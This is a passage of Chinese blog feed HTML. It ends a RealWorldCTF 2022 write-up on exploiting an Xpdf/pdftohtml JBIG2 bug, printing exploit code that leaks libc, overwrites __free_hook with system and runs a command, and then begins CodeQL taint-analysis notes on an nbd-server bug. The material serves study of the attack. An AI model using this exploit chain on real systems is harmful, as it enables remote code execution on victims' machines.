class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class BitSeg:</span><br><span class="line">    _seq &#x3D; itertools.count(10000)</span><br><span class="line"></span><br><span class="line">    def __init__(self, seg_num):</span><br><span class="line">        self.seg_num &#x3D; seg_num</span><br><span class="line">        self.__consumed &#x3D; False</span><br><span class="line"></span><br><span class="line">    def consume(self):</span><br><span class="line">        assert not self.__consumed</span><br><span class="line">        self.__consumed &#x3D; True</span><br><span class="line">        return self.seg_num</span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def from_page(cls, offset):</span><br><span class="line">        x, y &#x3D; offset % 2 ** 27, offset &#x2F;&#x2F; 2 ** 27</span><br><span class="line">        idx &#x3D; next(cls._seq)</span><br><span class="line">        page0.append(ReadoutRefinement(idx, x&#x3D;x, y&#x3D;y, imm&#x3D;False))</span><br><span class="line">        return cls(idx)</span><br><span class="line"></span><br><span class="line">class CombOp(enum.IntEnum):</span><br><span class="line">    Or &#x3D; 0</span><br><span class="line">    And &#x3D; 1</span><br><span class="line">    Xor &#x3D; 2</span><br><span class="line">    Xnor &#x3D; 3</span><br><span class="line">    Replace &#x3D; 4</span><br><span class="line"></span><br><span class="line">def bitop(oa, ob, op: CombOp):</span><br><span class="line">    b &#x3D; BitSeg.from_page(ob)</span><br><span class="line">    x, y &#x3D; oa % 2 ** 27, oa &#x2F;&#x2F; 2 ** 27</span><br><span class="line">    page0.append(</span><br><span class="line">        ReadoutRefinement(65536, x&#x3D;x, y&#x3D;y, imm&#x3D;True, ref&#x3D;b.consume(), comb_op&#x3D;op)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><blockquote><p>原语 bitop 的 oa、ob 两个参数的单位为 bit，op 有 5 种。</p></blockquote><p>bitop 原语初始时将一维偏移量 oa、ob 分别<strong>映射</strong>至 bitmap 的二维偏移量 xy1、xy2，之后在解析 ob 对应的 RefinementRegionSeg 时，从 pageBitmap 中取出对应 xy2 的数据，并将其存入 segments 中。</p><blockquote><p>一维偏移量向二维偏移量映射时，为什么使用的是 2^27 作为除数/模数呢？因为这是上面所修改后的 width 的大小。</p></blockquote><p>接下来当 hso 解析 oa 对应的 RefinementRegionSeg 时，hso 会重新读入先前存入的 ob 对应的 RefinementRegion，并将其与 pageBitmap 特定 xy1 位置进行位运算，达到<strong>指定 pageBitmap 上任意两位之间进行位运算</strong>的目的。</p><p>这里需要注意的是，findSegment 查找算法的核心，是<strong>依次遍历 segments 列表的元素并比对 segNum 来进行查找</strong>。因此每次添加进 segment 的 RefinementRegion，其 <strong>segNum 一定不能与之前 append 进去的 segments 相同！</strong></p><p>当位运算原语 <code>binop</code> 可用后，接下来就可以构建其他原语：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bitwise_mov &#x3D; lambda a, b: bitop(a, b, CombOp.Replace)</span><br><span class="line">bitwise_xor &#x3D; lambda a, b: bitop(a, b, CombOp.Xor)</span><br><span class="line">bitwise_and &#x3D; lambda a, b: bitop(a, b, CombOp.And)</span><br><span class="line">bitwise_or &#x3D; lambda a, b: bitop(a, b, CombOp.Or)</span><br><span class="line"></span><br><span class="line">def op_q_q(oa, ob, op: CombOp):</span><br><span class="line">    for i in range(64):</span><br><span class="line">        bitop(oa * 8 + i, ob * 8 + i, op)</span><br><span class="line"></span><br><span class="line"># Offsets are in bytes.</span><br><span class="line">mov_q_q &#x3D; lambda a, b: op_q_q(a, b, CombOp.Replace)</span><br><span class="line">xor_q_q &#x3D; lambda a, b: op_q_q(a, b, CombOp.Xor)</span><br><span class="line">and_q_q &#x3D; lambda a, b: op_q_q(a, b, CombOp.And)</span><br><span class="line">or_q_q &#x3D; lambda a, b: op_q_q(a, b, CombOp.Or)</span><br></pre></td></tr></table></figure><p>这里的 <code>op_q_q</code> 原语，其 oa、ob 参数的<strong>单位为字节</strong>（注意和 binop 的单位并不相同）。</p><p><code>op_q_q</code> 原语的目的，是对给定 <code>oa</code> 和 <code>ob</code> 的相对一维偏移字节所对应的两个位置，做一次<strong>8字节位运算</strong>。</p><p>举个例子，原语 <code>and_q_q(0, 8)</code>，执行的操作为：</p><ul><li>将<strong>偏移量为 0字节</strong> 的位置上的八字节(即 0-7 这8个字节)，与 <strong>偏移量为 8字节</strong> 的位置上的 八字节（即 8-15 这8字节），进行一次一一对应的 and 运算。</li><li>将运算结果放置在<strong>偏移量为 0字节</strong> 的位置上的八字节(即 0-7 这8个字节)上。</li></ul><blockquote><p>这个原语其实很好理解，只是用文字记录下来感觉不太好记录，也可能是我文笔不太好。</p></blockquote><p>之后便是通过位运算来构建8字节全加器，可以先看看<a href="https://developer.aliyun.com/article/593228" target="_blank" rel="noopener">这篇文章</a>再看看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># Don&#39;t worry, Libra won&#39;t hu^W^W^W Xpdf allocates 1 more byte</span><br><span class="line">adder_buf_offset &#x3D; GLIST_DATA_SIZE &#x2F;&#x2F; 4 * 8 # 1024</span><br><span class="line"></span><br><span class="line">def add_q_q(oa, ob):</span><br><span class="line">    oa, ob &#x3D; oa * 8, ob * 8</span><br><span class="line">    ab_xor, ab_and, carry, ab_xor_c_and, zero &#x3D; range(</span><br><span class="line">        adder_buf_offset, adder_buf_offset + 5</span><br><span class="line">    )</span><br><span class="line">    # 初始时，最低位全加器的进位标志为0</span><br><span class="line">    bitwise_mov(carry, zero)</span><br><span class="line">    # 8字节 &#x3D; 64 位，因此这里的 range 为 64</span><br><span class="line">    for i in range(64):</span><br><span class="line">        # 这里是每个 **位** 的全加器，一个全加器由两个半加器构成</span><br><span class="line">        a_bit_offset &#x3D; oa + i &#x2F;&#x2F; 8 * 8 + (7 - i % 8)</span><br><span class="line">        b_bit_offset &#x3D; ob + i &#x2F;&#x2F; 8 * 8 + (7 - i % 8)</span><br><span class="line">        # This is a naive full-adder. Applying TIS-100 skill could cut 3~4 ops maybe.</span><br><span class="line">        # 首先是第一个半加器</span><br><span class="line">        bitwise_mov(ab_xor, a_bit_offset)</span><br><span class="line">        bitwise_xor(ab_xor, b_bit_offset)</span><br><span class="line">        bitwise_mov(ab_and, a_bit_offset)</span><br><span class="line">        bitwise_and(ab_and, b_bit_offset)</span><br><span class="line">        # 其次是第二个半加器</span><br><span class="line">        bitwise_mov(a_bit_offset, ab_xor)</span><br><span class="line">        bitwise_xor(a_bit_offset, carry)  # output (S)</span><br><span class="line">        bitwise_mov(ab_xor_c_and, ab_xor)</span><br><span class="line">        bitwise_and(ab_xor_c_and, carry)</span><br><span class="line">        # 设置进位标志</span><br><span class="line">        bitwise_mov(carry, ab_and)</span><br><span class="line">        bitwise_or(carry, ab_xor_c_and)</span><br></pre></td></tr></table></figure><p>其全加器结构如下所示：</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095455.jpg" alt=""></p><h3 id="3-立即数运算原语"><a href="#3-立即数运算原语" class="headerlink" title="3. 立即数运算原语"></a>3. 立即数运算原语</h3><p>除了上面所介绍的位运算原语以外，还有加载外部立即数计算的原语。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def op_q_imm(offset, imm, op):</span><br><span class="line">    offset *&#x3D; 8</span><br><span class="line">    x, y &#x3D; offset % 2 ** 27, offset &#x2F;&#x2F; 2 ** 27</span><br><span class="line">    page0.append(</span><br><span class="line">        GenericRegion(</span><br><span class="line">            233, x&#x3D;x, y&#x3D;y, comb_op&#x3D;op, bitmap&#x3D;Bitmap(struct.pack(&quot;&lt;Q&quot;, imm)), imm&#x3D;True</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">mov_q_imm &#x3D; lambda o, imm: op_q_imm(o, imm, CombOp.Replace)</span><br><span class="line">xor_q_imm &#x3D; lambda o, imm: op_q_imm(o, imm, CombOp.Xor)</span><br><span class="line">and_q_imm &#x3D; lambda o, imm: op_q_imm(o, imm, CombOp.And)</span><br><span class="line">or_q_imm &#x3D; lambda o, imm: op_q_imm(o, imm, CombOp.Or)</span><br></pre></td></tr></table></figure><p>readGenericRegionSeg 方法可从外部 JBIG2Stream 流中读入一个 bitmap 并将其与 pageBitmap 上的特定位置进行运算，因此 GenericRegionSeg 可用于此处的立即数运算原语。</p><h3 id="4-地址解引用原语"><a href="#4-地址解引用原语" class="headerlink" title="4. 地址解引用原语"></a>4. 地址解引用原语</h3><p>当我们有了某个指针的绝对地址后，我们如何将这个指针从该绝对地址中读取出来呢？这就需要用到地址解引用操作。这里，exploit 准备了两个原语：</p><ul><li><p><code>rebase_variable_q</code>：将 pageBitmap 中一维偏移为 <code>addr_page_offset</code> 处的 8 字节数据，复制进<strong>堆风水中最后一步所创建的</strong>带有 16 个 Bitmap 的 SymbolDict 中，第 idx 个 JBIG2Bitmap 的 <strong>data 字段</strong>上：</p><blockquote><p>注意，是直接将值覆盖在 JBIG2Bitmap 的 data 字段上，而不是写进 data 指针所指向的内存上。</p></blockquote>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def rebase_variable_q(idx, addr_page_offset):</span><br><span class="line">    mov_q_q(</span><br><span class="line">        variable_bitmap_offset + idx * ptmalloc_chunk_size(0x20) + 0x18,</span><br><span class="line">        addr_page_offset,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></li><li><p><code>load_variable</code>：读取最后一个 Symbol Dict 中，第 idx 个 JBIG2Bitmap <strong>backing store 里的</strong>（即 data 指针解引用后的内存上） 的第一个 8 字节数据，至 pageBitmap 中一维偏移为 <code>to_page_offset</code> 处的 8 字节内存位置。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def load_variable(to_page_offset, idx):</span><br><span class="line">    to_page_offset *&#x3D; 8</span><br><span class="line">    x, y &#x3D; to_page_offset % 2 ** 27, to_page_offset &#x2F;&#x2F; 2 ** 27</span><br><span class="line">    page0.append(</span><br><span class="line">        TextRegion(</span><br><span class="line">            233,</span><br><span class="line">            x&#x3D;x,</span><br><span class="line">            y&#x3D;y,</span><br><span class="line">            w&#x3D;64,</span><br><span class="line">            h&#x3D;1,</span><br><span class="line">            imm&#x3D;True,</span><br><span class="line">            instances&#x3D;[idx],</span><br><span class="line">            ref_symbol_cnt&#x3D;16,</span><br><span class="line">            ref_segs&#x3D;[105],</span><br><span class="line">        )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></li></ul><p>这两个原语一结合，就能达到地址解引用的目的。</p><h3 id="5-整体利用流程"><a href="#5-整体利用流程" class="headerlink" title="5. 整体利用流程"></a>5. 整体利用流程</h3><p>各类原语已经都准备好了，接下来便是结合这些原语覆写 free_hook 为 libc_system 的地址。</p><p>首先，我们需要 leak 一个地址出来（这个地址自然不能是堆地址），通过查看堆布局：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; low address .....</span><br><span class="line">...</span><br><span class="line">SymbolDict3-8;</span><br><span class="line">pageBitmap backing buffer &#x2F;&#x2F; size&#x3D;16 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict9-16;</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F; high address .....</span><br></pre></td></tr></table></figure><p>可以看到紧临着 pageBitmap 的便是 SymbolDict，因此我们可以尝试读取其<strong>虚表指针</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vtbl of a JBIG2SymbolDict adajacent to page bitmap buffer</span><br><span class="line"># 取出vtbl地址放到+0处</span><br><span class="line">mov_q_q(0, ptmalloc_chunk_size(GLIST_DATA_SIZE &#x2F;&#x2F; 4))</span><br></pre></td></tr></table></figure><p>之后从外部读取一个相对偏移至 pageBitmap data + 8 的位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 计算出-vtbl_offset + free_got_offset</span><br><span class="line">mov_q_imm(</span><br><span class="line">    8, (-PDFTOHTML_VTBL_JBIG2SYMBOLDICT_OFFSET + PDFTOHTML_FREE_GOT_OFFSET) % 2 ** 64</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后再简单做个加法，就能得到 free 条目在 GOT 表上的绝对地址，放到 +0 处：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 计算vtbl地址+(-vtbl_offset + free_got_offset)得到free_got的地址，放到+0处</span><br><span class="line">add_q_q(0, 8)</span><br></pre></td></tr></table></figure><p>接下来，尝试对该 <code>free.got</code> 地址进行解引用，获取 <code>free.libc</code> 地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 从+0处取出free_got的地址，放到第0个&quot;变量&quot;data 指针处</span><br><span class="line">rebase_variable_q(0, 0)</span><br><span class="line"># 取出存放在第0个&quot;变量&quot;里的值（此时该值为 libc.free 的绝对地址），放到+8处</span><br><span class="line">load_variable(8, 0)  # address of libc.free at +8</span><br></pre></td></tr></table></figure><p>在获取到 <code>free.libc</code> 地址后，读入一个相对偏移并做个加法，经过简单几步，我们便能得到 <code>free_hook</code> 和 <code>libc_system</code> 的绝对地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 把LIBC_FREE_OFFSET这个立即数的值放到+0处</span><br><span class="line">mov_q_imm(0, -LIBC_FREE_OFFSET % 2 ** 64)</span><br><span class="line"># 计算free_got的地址+(-libc_free_offset)，得到libc基地址，放到+8处</span><br><span class="line">add_q_q(8, 0)</span><br><span class="line"># 复制+8处存放的libc基地址至+0处</span><br><span class="line">mov_q_q(0, 8)</span><br><span class="line"># 把LIBC_FREE_HOOK_OFFSET这个立即数放到+16处</span><br><span class="line">mov_q_imm(16, LIBC_FREE_HOOK_OFFSET)</span><br><span class="line"># 计算出libc基地址+LIBC_FREE_HOOK_OFFSET,即free_hook的绝对地址，放到+0处</span><br><span class="line">add_q_q(0, 16)</span><br><span class="line"># 取出system的偏移这个立即数，放到+16处</span><br><span class="line">mov_q_imm(16, LIBC_SYSTEM_OFFSET)</span><br><span class="line"># 计算出system的绝对地址，放到+8处</span><br><span class="line">add_q_q(8, 16)</span><br></pre></td></tr></table></figure><p>注意，此时 <code>pageBitmap-&gt;data</code> 上的数据为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+0: free_hook_address     +8: libc_system_address</span><br></pre></td></tr></table></figure><p>接下来便是计算 <code>pageBitmap-&gt;data + 8</code> 的地址，即存放着这个 <code>libc_system_address</code> 值的内存地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 取出pagebitmap的data指针，放到+24处</span><br><span class="line">mov_q_q(24, page_bitmap_buf_to_data_ptr)</span><br><span class="line"># 把立即数8放到+16处</span><br><span class="line">mov_q_imm(16, 8)</span><br><span class="line"># 将data指针加上8，并将结果放到+24处</span><br><span class="line">add_q_q(24, 16)</span><br></pre></td></tr></table></figure><p>计算出这个内存地址的用处是什么呢？继续向下看，注意重头戏快到了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 取出pagebitmap的data指针的值放到第0个变量的 data 字段</span><br><span class="line">rebase_variable_q(0, page_bitmap_buf_to_data_ptr)</span><br><span class="line"># 取出data指针+8的值，放到第1个变量的 data 字段</span><br><span class="line">rebase_variable_q(1, 24)</span><br><span class="line"># 取出第0个变量的值，放到data指针处, 这一步会修改 data 指针为 free_hook_address</span><br><span class="line">load_variable(page_bitmap_buf_to_data_ptr, 0)</span><br><span class="line"># 取出第1个变量的值（也就是 libc_system_address），放到+0处，也就是 free_hook 基地址上的那个指针值</span><br><span class="line"># 这样就完成了改写 free hook 的操作</span><br><span class="line">load_variable(0, 1)</span><br></pre></td></tr></table></figure><p>这样，<strong>此时的 free hook 便被改写成了 libc_system 的地址</strong>，接下来便是尝试执行命令。</p><p>这里再 append 一个 带有待执行命令的 bitmap：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">page0.append(</span><br><span class="line">    GenericRegion(233, x&#x3D;64, y&#x3D;0, comb_op&#x3D;CombOp.And, bitmap&#x3D;Bitmap(COMMAND_TO_RUN))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这样当 <code>readGenericRegionSeg</code> 函数结束时，新创建的 bitmap（即带有命令的 bitmap）将会被 free 掉，这样就可以触发 <code>system(command)</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                                       GBool lossless, Guint length)</span><br><span class="line">&#123;</span><br><span class="line">    [...];</span><br><span class="line">    &#x2F;&#x2F; read the bitmap</span><br><span class="line">    bitmap &#x3D; readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,</span><br><span class="line">                               NULL, atx, aty, mmr ? length - 18 : 0);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; combine the region bitmap into the page bitmap</span><br><span class="line">    if (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        if (pageH &#x3D;&#x3D; 0xffffffff &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        &#x2F;&#x2F; 在这里触发 system</span><br><span class="line">        delete bitmap;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; store the region bitmap</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但有两点需要注意：</p><ol><li><p>imm 必须为 true，这样才能触发 delete 操作。</p></li><li><p>创建的 GenericRegionSeg，其<strong>二维偏移 xy 映射至一维偏移后的偏移量，不能小于 64（即 8 字节）</strong></p><p> 这是因为代码中会先执行 <code>pageBitmap-&gt;combine</code> 再执行 <code>delete bitmap</code> 操作。此时的 <code>pageBitmap-&gt;data</code> 为 free hook address，如果执行 combine 时修改了<code>pageBitmap-&gt;data</code> 最低的8个字节，那么 free 时就无法调用到 libc_system，因为保存在 free_hook 上面的 libc_system 地址被破坏了。</p></li></ol><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><ul><li><p><a href="https://github.com/Riatre/hso-groupie" target="_blank" rel="noopener">hso-groupie - Riatre github</a></p></li><li><p><a href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" target="_blank" rel="noopener">A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution - Google Project Zero</a></p></li><li><p><a href="https://blog.csdn.net/tjcwt2011/article/details/107877566" target="_blank" rel="noopener">一个简单PDF文件的结构分析 - CSDN</a></p></li><li><p><a href="https://blog.csdn.net/lacoucou/article/details/114638913" target="_blank" rel="noopener">PDF 文件格式 基本结构 - CSDN</a></p></li><li><p><a href="https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf" target="_blank" rel="noopener">https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf - Adobe</a></p><blockquote><p>重点在 7.4.7 JBIG2Decode Filter 这节。</p></blockquote></li><li><p><a href="https://github.com/agl/jbig2enc/blob/master/fcd14492.pdf" target="_blank" rel="noopener">Coding of Still Pictures : JBIG &amp; JPEG - JBIG Committee</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;realworldctf-2022-hso-writeup与nso-iMessage-0click漏洞分析&quot;&gt;&lt;a href=&quot;#realworldctf-2022-hso-writeup与nso-iMessage-0click漏洞分析&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CodeQL 数据流分析/污点分析 笔记（上篇）</title>
    <link href="http://eternalsakura13.com/2022/02/08/codeql_flow_analyze/"/>
    <id>http://eternalsakura13.com/2022/02/08/codeql_flow_analyze/</id>
    <published>2022-02-08T02:15:02.558Z</published>
    <updated>2022-02-10T09:50:32.322Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CodeQL-数据流分析-污点分析-笔记（上篇）"><a href="#CodeQL-数据流分析-污点分析-笔记（上篇）" class="headerlink" title="CodeQL 数据流分析/污点分析 笔记（上篇）"></a>CodeQL 数据流分析/污点分析 笔记（上篇）</h1><p>欢迎大家关注公众号”天问记事簿”，以及加入天问之路知识星球，一起做技术分享，一起学习，happy hack。</p><h2 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h2><p>codeql关于数据流分析的基础文档可以在这里找到，本文中不多做叙述。</p><ul><li><a href="https://codeql.github.com/docs/writing-codeql-queries/creating-path-queries/#creating-path-queries" target="_blank" rel="noopener">https://codeql.github.com/docs/writing-codeql-queries/creating-path-queries/#creating-path-queries</a></li><li><a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-cpp/#analyzing-data-flow-in-cpp" target="_blank" rel="noopener">https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-cpp/#analyzing-data-flow-in-cpp</a></li></ul><p>codeql文档里对于数据流和污点的区别描述是这样的。</p><p>在标准库中，我们区分了正常数据流和污点跟追踪。</p><p>例如，如果您正在跟踪一个不安全的对象 x（可能是一些不受信任的或潜在的恶意数据），程序中的一个步骤可能会改变它的值。因此，在 <code>y = x + 1</code> 这样的简单计算中，正常的数据流分析会突出使用 x，而不是 y。然而，由于 y 是从 x 派生的，它会受到不受信任或“污染”信息的影响，因此它也被污染了。分析从 x 到 y 的污点流称为污点跟踪。</p><p>污点分析在数据流分析的基础之上，额外在控制流图上建立了许多边，以此实现。本文主要就笔者对该库的分析做了记录，如有错误还请指正。</p><h2 id="使用case"><a href="#使用case" class="headerlink" title="使用case"></a>使用case</h2><h3 id="污点建模"><a href="#污点建模" class="headerlink" title="污点建模"></a>污点建模</h3><p>这里以rwctf中who move my block这道题涉及的<a href="https://github.com/NetworkBlockDevice/nbd" target="_blank" rel="noopener">nbd-server</a>的一个漏洞为例来简述如何使用污点分析。</p><p>首先从 <code>accept</code> 函数开始找起，它是整个 socket 连接的起点，通过它我们可以根据交叉引用找到处理连接的函数 <code>handle_modern_connection</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">handle_modern_connection(GArray *<span class="keyword">const</span> servers, <span class="keyword">const</span> <span class="keyword">int</span> sock, struct generic_conf *genconf)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    net = socket_accept(sock);</span><br><span class="line">    <span class="keyword">if</span> (net &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!dontfork) &#123;</span><br><span class="line">        <span class="comment">// 重要！：注意这里会 fork 出一个子进程来单独处理新连接</span></span><br><span class="line">        pid = spawn_child(&amp;commsocket);</span><br><span class="line">        <span class="keyword">if</span> (pid) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                msg(LOG_INFO, <span class="string">"Spawned a child process"</span>);</span><br><span class="line">                g_array_append_val(childsocks, commsocket);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">                msg(LOG_ERR, <span class="string">"Failed to spawn a child process"</span>);</span><br><span class="line">            close(net);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Child just continues. */</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 连接协商</span></span><br><span class="line">    client = negotiate(net, servers, genconf);</span><br><span class="line">       </span><br><span class="line">    [...]</span><br><span class="line">       </span><br><span class="line">    msg(LOG_INFO, <span class="string">"Starting to serve"</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 开始处理</span></span><br><span class="line">    mainloop_threaded(client);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">handler_err:</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，默认情况下对于每个连接，server 都会 fork 一个新的子进程来单独处理。这个特性相当重要，因为我们可以利用这个特性来<strong>爆破 canary 和 PIE</strong>。</p><p>该函数会调用 <code>negotiate</code> 函数，并创建结构体 <code>CLIENT</code>，将新连接的 fd 赋给该 client，之后后续使用 <code>socket_read(client, addr, len)</code> 来从 client（即我们这边）读取数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 